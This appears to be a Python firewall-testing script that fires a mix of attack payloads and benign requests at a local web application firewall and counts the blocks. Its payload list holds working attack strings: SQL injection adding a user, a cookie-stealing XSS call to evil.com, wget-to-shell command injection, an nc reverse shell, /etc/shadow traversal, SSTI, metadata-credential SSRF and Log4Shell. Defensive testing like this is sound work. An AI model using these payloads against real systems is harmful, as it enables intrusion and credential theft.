#!/usr/bin/env python3
"""
VeriFireWall - Enterprise Multi-Vector High-Frequency Attack Simulator
----------------------------------------------------------------------
Generates realistic, high-throughput attack vectors covering 13 OWASP & Enterprise Threat Categories
to test VeriFireWall anomaly detection engine and feed real-time metrics into Grafana.
"""

import sys
import time
import argparse
import random
import urllib.parse
import urllib.request
import urllib.error

TARGET_URL = "http://localhost:80"

# 13 Core Security Attack Categories
ATTACK_VECTORS = [
    # 1. SQL Injection (SQLi)
    {"type": "1. SQL Injection", "path": "/rest/user/login", "param": "email", "payload": "' UNION SELECT 1, banner, version() FROM v$version--"},
    {"type": "1. SQL Injection", "path": "/api/Products/search", "param": "q", "payload": "1'; EXEC xp_cmdshell('net user hacker P@ss123 /add')--"},

    # 2. Cross-Site Scripting (XSS)
    {"type": "2. Cross-Site Scripting", "path": "/api/Feedbacks", "param": "comment", "payload": "<svg/onload=fetch('//evil.com/steal?c='+document.cookie)>"},
    {"type": "2. Cross-Site Scripting", "path": "/profile", "param": "username", "payload": "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>"},

    # 3. Remote Code Execution (RCE) / Command Injection
    {"type": "3. Command Injection / RCE", "path": "/api/tools/ping", "param": "host", "payload": "127.0.0.1 && wget http://malicious.bin -O- | sh"},
    {"type": "3. Command Injection / RCE", "path": "/cgi-bin/status", "param": "ip", "payload": "() { :;}; /bin/bash -c 'nc -e /bin/bash 10.0.0.1 4444'"},

    # 4. Local File Inclusion (LFI) & Path Traversal
    {"type": "4. Local File Inclusion", "path": "/ftp", "param": "file", "payload": "../../../../../../../../etc/passwd%00"},
    {"type": "4. Local File Inclusion", "path": "/view/log", "param": "path", "payload": "....//....//....//etc/shadow"},

    # 5. Remote File Inclusion (RFI)
    {"type": "5. Remote File Inclusion", "path": "/include", "param": "page", "payload": "http://evil-server.com/malicious_shell.txt?"},

    # 6. XML External Entity (XXE) Injection
    {"type": "6. XXE Injection", "path": "/api/xml/upload", "param": "xml", "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>"},

    # 7. Server-Side Template Injection (SSTI)
    {"type": "7. SSTI Template Injection", "path": "/render", "param": "template", "payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"},

    # 8. Server-Side Request Forgery (SSRF)
    {"type": "8. SSRF Attack", "path": "/api/fetch", "param": "url", "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},

    # 9. LDAP / NoSQL Injection
    {"type": "9. NoSQL / LDAP Injection", "path": "/api/nosql/login", "param": "user", "payload": "admin' || '1'=='1"},
    {"type": "9. NoSQL / LDAP Injection", "path": "/rest/user/login", "param": "password", "payload": "{\"$ne\": null}"},

    # 10. Log4Shell / JNDI Exploit (CVE-2021-44228)
    {"type": "10. Log4Shell / JNDI", "path": "/api/v1/search", "param": "query", "payload": "${jndi:ldap://attacker.com/a}"},

    # 11. OWASP Automated Reconnaissance Scanner Probes
    {"type": "11. Scanner Reconnaissance", "path": "/.env", "param": "ref", "payload": "sqlmap/1.6.0#dev (http://sqlmap.org)"},
    {"type": "11. Scanner Reconnaissance", "path": "/wp-config.php.bak", "param": "id", "payload": "Nikto/2.1.6"},

    # 12. Open Redirect Exploits
    {"type": "12. Open Redirect", "path": "/redirect", "param": "to", "payload": "https://phishing-fake-login.com"},

    # 13. Broken Access Control & Protocol Tampering
    {"type": "13. Broken Access Control", "path": "/api/Users/1/admin_privileges", "param": "role", "payload": "superadmin_bypass_override"}
]

BENIGN_TRAFFIC = [
    {"path": "/", "param": "", "payload": ""},
    {"path": "/#/search", "param": "q", "payload": "apple juice"},
    {"path": "/rest/products/search", "param": "q", "payload": "banana"},
    {"path": "/api/Quantitys", "param": "limit", "payload": "10"},
    {"path": "/assets/public/favicon.ico", "param": "", "payload": ""}
]

def send_http_probe(url: str, post_data: bytes = None):
    req = urllib.request.Request(
        url,
        data=post_data,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) VeriFireWall-HighFreq-Tester/2.0",
            "Accept": "*/*"
        }
    )
    try:
        with urllib.request.urlopen(req, timeout=2) as resp:
            return resp.status, "ALLOWED (200 OK)"
    except urllib.error.HTTPError as e:
        if e.code in [403, 400]:
            return e.code, "BLOCKED (VeriFireWall Anomaly Enforcement)"
        return e.code, f"HTTP {e.code}"
    except Exception as e:
        return 0, f"Connection Failed ({e})"

def main():
    parser = argparse.ArgumentParser(description="VeriFireWall High-Frequency 13-Vector Attack Simulator")
    parser.add_argument("--rate", "-r", type=int, default=50, help="Requests per second target (default: 50)")
    parser.add_argument("--duration", "-d", type=int, default=300, help="Duration in seconds (default: 300s)")
    args = parser.parse_args()

    print("=" * 80)
    print(" 🔥 VeriFireWall High-Frequency 13-Vector Anomaly Attack Simulator")
    print(f" 🎯 Target WAF Proxy:    {TARGET_URL}")
    print(f" ⚡ Attack Frequency:    ~{args.rate} requests/sec")
    print(f" 📊 Grafana Dashboard:   http://localhost:3001")
    print("=" * 80)

    start_time = time.time()
    total_sent = 0
    blocked_count = 0

    while time.time() - start_time < args.duration:
        batch_start = time.time()
        for _ in range(args.rate):
            total_sent += 1
            if random.random() < 0.7:  # 70% Attack, 30% Benign
                attack = random.choice(ATTACK_VECTORS)
                encoded = urllib.parse.urlencode({attack["param"]: attack["payload"]}) if attack["param"] else ""
                url = f"{TARGET_URL}{attack['path']}" + (f"?{encoded}" if encoded else "")
                status, result = send_http_probe(url)
                if status in [403, 400]:
                    blocked_count += 1
                print(f" [{total_sent:04d}] 🔥 [{attack['type']:<28}] => {result}")
            else:
                benign = random.choice(BENIGN_TRAFFIC)
                encoded = urllib.parse.urlencode({benign["param"]: benign["payload"]}) if benign["param"] else ""
                url = f"{TARGET_URL}{benign['path']}" + (f"?{encoded}" if encoded else "")
                status, result = send_http_probe(url)
                print(f" [{total_sent:04d}] ✅ [Legitimate Traffic          ] => {result}")

        elapsed = time.time() - batch_start
        if elapsed < 1.0:
            time.sleep(1.0 - elapsed)

    print("=" * 80)
    print(f" ✅ Finished sending {total_sent} requests ({blocked_count} blocked by VeriFireWall).")
    print(" 📊 Check Grafana Dashboard at http://localhost:3001 !")
    print("=" * 80)

if __name__ == "__main__":
    main()
